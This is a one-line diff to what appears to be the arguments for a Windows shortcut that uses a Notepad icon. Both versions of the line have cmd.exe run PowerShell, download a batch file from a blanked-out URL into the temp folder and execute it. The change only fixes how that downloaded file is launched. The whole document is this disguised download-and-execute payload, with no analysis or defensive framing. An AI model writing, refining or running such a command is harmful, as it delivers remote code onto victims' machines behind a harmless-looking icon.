@@ -1,1 +1,1 @@
-"C:\Windows\system32\cmd.exe" -a "/k powershell wget '----' -OutFile $env:TEMP\\1mb.bat; cmd $env:TEMP\\1mb.bat" -i "C:\Windows\system32\notepad.exe"
+"C:\Windows\system32\cmd.exe" -a "/k powershell wget '----' -OutFile $env:TEMP\\1mb.bat; cmd /c %TEMP%\1mb.bat" -i "C:\Windows\system32\notepad.exe"
